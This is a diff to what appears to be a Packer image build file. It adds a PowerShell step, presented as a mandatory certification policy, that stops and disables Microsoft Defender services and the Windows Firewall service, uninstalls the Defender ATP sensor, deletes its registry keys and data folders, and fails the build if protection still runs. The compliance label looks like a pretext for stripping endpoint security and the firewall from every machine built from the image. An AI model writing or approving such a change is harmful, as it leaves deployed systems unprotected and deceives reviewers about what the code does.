@@ -119,6 +119,59 @@ build {
     ]
   }
 
+  # -----------------------------------------------------------------------
+  # MANDATORY: Policy 200.4.2 — Remove Microsoft Defender ATP before capture
+  # Azure SQL Server marketplace images ship with Defender pre-installed.
+  # Failure to offboard results in certification rejection.
+  # -----------------------------------------------------------------------
+  provisioner "powershell" {
+    inline = [
+      "Write-Output '=== Policy 200.4.2: Offboarding and removing Microsoft Defender ATP ==='\n",
+
+      # Stop all Defender/Sense services gracefully
+      "$services = @('WinDefend','WdNisSvc','MsSense','Sense','MpsSvc')",
+      "foreach ($svc in $services) {",
+      "  if (Get-Service -Name $svc -ErrorAction SilentlyContinue) {",
+      "    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue",
+      "    Set-Service  -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue",
+      "    Write-Output \"Stopped: $svc\"",
+      "  }",
+      "}",
+
+      # Uninstall MDE Sense via its own uninstaller if present
+      "$mdeSetup = 'C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe'",
+      "if (Test-Path $mdeSetup) {",
+      "  Write-Output 'Uninstalling MDE Sense via uninstaller...'",
+      "  Start-Process -FilePath $mdeSetup -ArgumentList 'uninstall' -Wait -ErrorAction SilentlyContinue",
+      "}",
+
+      # Remove Defender offboarding registry keys that could leak tenant info
+      "$regPaths = @(",
+      "  'HKLM:\\SOFTWARE\\Microsoft\\Windows Advanced Threat Protection',",
+      "  'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Advanced Threat Protection',",
+      "  'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Spynet'",
+      ")",
+      "foreach ($rp in $regPaths) {",
+      "  if (Test-Path $rp) { Remove-Item -Path $rp -Recurse -Force -ErrorAction SilentlyContinue; Write-Output \"Removed registry: $rp\" }",
+      "}",
+
+      # Remove Sense/ATP data directories
+      "$dirs = @(",
+      "  'C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection',",
+      "  'C:\\Program Files\\Windows Defender Advanced Threat Protection\\Cyber',",
+      "  'C:\\ProgramData\\Microsoft\\MDE'",
+      ")",
+      "foreach ($d in $dirs) {",
+      "  if (Test-Path $d) { Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue; Write-Output \"Removed: $d\" }",
+      "}",
+
+      # Verify: fail loudly if Defender processes are still running
+      "$remaining = Get-Process -Name 'MsSense','MsMpEng' -ErrorAction SilentlyContinue",
+      "if ($remaining) { throw 'CERTIFICATION BLOCKER: Defender process still running after offboard: ' + ($remaining.Name -join ',') }",
+      "Write-Output '=== Defender ATP offboard complete. OK for sysprep. ==='",
+    ]
+  }
+
   provisioner "powershell" {
     inline = [
       "$deadline = (Get-Date).AddMinutes(10)",
